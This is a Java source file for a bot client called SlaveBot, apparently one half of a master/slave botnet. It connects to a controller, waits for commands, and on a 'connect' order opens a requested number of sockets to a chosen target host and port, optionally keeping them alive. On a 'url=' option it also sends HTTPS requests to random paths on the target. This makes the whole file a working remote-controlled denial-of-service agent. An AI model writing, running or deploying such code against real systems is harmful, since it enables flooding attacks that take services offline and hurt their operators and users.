import java.io.*;
import java.net.*;
import java.util.*;
import java.text.*;


class slaveSocketDetails{
Socket 	targetSocket;
String 	regDate;
String 	targetHostIP;
String 	targetAddressName;
int	    targetPortNumber;

 slaveSocketDetails() {
	Date currDate = new Date();
	regDate= new SimpleDateFormat("yyyy-MM-dd").format(currDate);
  }
}

public class SlaveBot {
    public static ArrayList<slaveSocketDetails> slaveconnList=new ArrayList<slaveSocketDetails>();
    public static Socket slaveSocket;
    public static void main(String[] args) throws Exception {
        if (args.length<4){
            System.out.println("Error in the arguments provided");
            System.exit(-1);	
        }
        String hostname = "";
        String portno = "";
        if (args[0].equals("-h") && args[2].equals("-p")){ 
            hostname=args[1];
            portno=args[3];
        }
        else if (args[0].equals("-p") && args[2].equals("-h")){ 
            hostname=args[3];
            portno=args[1];
        }
        else{
            System.out.println("Hostname and Port number should be provided with args -h and -p respectively");
            System.exit(-1);
        }
        try{
            Integer.parseInt(portno);
        }
        catch (Exception e){
           System.out.println("Port number provided is Invalid");
           System.exit(-1);
        }
        slaveSocket = new Socket(hostname, Integer.parseInt(portno));
        BufferedReader netIn = new BufferedReader(new InputStreamReader(slaveSocket.getInputStream()));
        slaveSocketDetails slaveTargetList;
        while (true) {
            try{
                String commandFromServer = netIn.readLine();
                if (commandFromServer !="") {
                    String[] serverCommand = commandFromServer.split(" ");
                    if(serverCommand[0].equals("connect")){
                        String targethostname = serverCommand[1];
                        int targetport = Integer.parseInt(serverCommand[2].toString());
                        int noofconn = Integer.parseInt(serverCommand[3].toString());
                        Socket slavetargetSocket;
                        if(serverCommand[5].equals("none")){    	
                            for (int i=0; i< noofconn; i++){
                                try{	
                                    //System.out.println("Entered to Url=none block");
                                    slavetargetSocket = new Socket(targethostname, targetport);
                                    slaveTargetList=new slaveSocketDetails();
                                    slaveTargetList.targetHostIP=slavetargetSocket.getInetAddress().getHostAddress();
                                    slaveTargetList.targetAddressName=slavetargetSocket.getInetAddress().getHostName();
                                    slaveTargetList.targetPortNumber=targetport;
                                    slaveTargetList.targetSocket=slavetargetSocket;
                                    slaveconnList.add(slaveTargetList);
                                    if(serverCommand[4].equals("keepalive")){
                                        //System.out.println("Entered to keepalive block");
                                        slavetargetSocket.setKeepAlive(true);
                                    }
                                }
                                catch (Exception e) {
                                    System.out.println(" could not open connection for  " + targethostname+" " + targetport);
                                }
                            }
                        }
                        else if (serverCommand[5].contains("url=")){
                            for (int i=0; i< noofconn; i++){
                                try{	
                                    //System.out.println("Entered to Url valid block");
                                    slavetargetSocket = new Socket(targethostname, targetport);
                                    slaveTargetList=new slaveSocketDetails();
                                    slaveTargetList.targetHostIP=slavetargetSocket.getInetAddress().getHostAddress();
                                    slaveTargetList.targetAddressName=slavetargetSocket.getInetAddress().getHostName();
                                    slaveTargetList.targetPortNumber=targetport;
                                    slaveTargetList.targetSocket=slavetargetSocket;
                                    slaveconnList.add(slaveTargetList);
                                    if(serverCommand[4].equals("keepalive")){
                                        //System.out.println("Entered to keepalive block");
                                        slavetargetSocket.setKeepAlive(true);
                                    }
                                    Random rand = new Random();
                                    int strlen = rand.nextInt(10)+1;
                                    String randstr="";
                                    for(int j= 0; j<strlen; j++)
                                    {
                                        int randno = rand.nextInt(26)+97;
                                        randstr += Character.toString((char)(int)randno);
                                    }
                                    //System.out.println(" executed till here ");
                                    String url = "https://"+targethostname+serverCommand[5].substring(4)+randstr;
                                    //System.out.println(url);
									URL url_gen = new URL(url);
                                    HttpURLConnection httpUrlConnect = (HttpURLConnection) url_gen.openConnection();
									httpUrlConnect.setRequestMethod("GET");
									httpUrlConnect.connect();
									int urlMessage = httpUrlConnect.getResponseCode();
									BufferedReader in = new BufferedReader(new InputStreamReader(httpUrlConnect.getInputStream()));
                                    String inputLine;
                                    StringBuffer response = new StringBuffer();
                                    while ((inputLine = in.readLine()) != null) {
                                        response.append(inputLine);
                                    }
                                    in.close();
                                }
                                catch (Exception e) {
                                    System.out.println(" could not open connection for  " + targethostname+" " + targetport);
                                }
                            }
                        }
                    }
                    else if (serverCommand[0].equals("disconnect")){
                        String targetname = serverCommand[1];
                        int targetportno =Integer.parseInt(serverCommand[2].toString());
                        Iterator<slaveSocketDetails> i = slaveconnList.iterator();
                        while (i.hasNext()) {
                            slaveSocketDetails delSocket =i.next();
                            if(delSocket.targetHostIP.equals(targetname) || delSocket.targetAddressName.equals(targetname)){
                                if(targetportno==0 || delSocket.targetPortNumber==targetportno ){
                                    delSocket.targetSocket.close();
                                    i.remove();
                                }
                            }
                        }
                    }
                }
                else{
                 System.out.println(" not a proper command " +  commandFromServer);
                }
            }
            catch (Exception e) {
                e.printStackTrace();
                System.exit(-1);	   
            }
        }
    }
}